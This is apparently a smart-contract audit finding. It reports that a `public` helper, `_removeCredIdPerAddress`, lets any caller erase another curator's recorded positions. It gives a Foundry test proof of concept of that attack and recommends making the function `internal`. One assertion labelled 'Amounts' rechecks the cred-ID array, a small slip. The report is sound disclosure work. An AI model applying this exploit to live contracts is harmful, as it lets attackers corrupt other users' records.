# Vulnerability details

## Impact
A malicious user can manipulate other curators' positions by calling `_removeCredIdPerAddress`, which breaks the reporting logic.

## Proof of Concept
The dev team left `_removeCredIdPerAddress` as `public`, allowing malicious users to exploit it and disrupt the `getPositionsForCurator` function.

Simple POC -
```
    function test_DisplayWrongfulCredPosition() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        assertEq(buyPrice, 1_091_874_359_329_268, "buy price is correct");
        vm.startPrank(anyone);
        cred.buyShareCred{ value: buyPrice }(1, 1, 0);
        assertEq(cred.isShareHolder(1, anyone), true, "cred 0 is voted by anyone");
        uint256[] memory credIdsBefore;
        uint256[] memory amountsBefore;
        (credIdsBefore, amountsBefore) = cred.getPositionsForCurator(anyone, 0, 0);
        assertEq(credIdsBefore.length, 1, "Creds are shown correctly");
        assertEq(credIdsBefore.length, 1, "Amounts are shown correctly");
        vm.stopPrank();

        address attacker = makeAddr(("attacker"));
        vm.startPrank(attacker);
        >> cred._removeCredIdPerAddress(1, anyone);
        uint256[] memory credsIdsAfter;
        uint256[] memory amountsAfter;
        (credsIdsAfter, amountsAfter) = cred.getPositionsForCurator(anyone, 0, 0);
        >> assertEq(credsIdsAfter.length, 0, "Creds are shown incorrectly, after attacker interference");
        >> assertEq(amountsAfter.length, 0, "Amounts are shown incorrectly, after attacker interference");
        vm.stopPrank();
    }
```

## Tools Used
foundry

## Recommended Mitigation Steps
Change `_removeCredIdPerAddress` accessor from `public` to `internal`
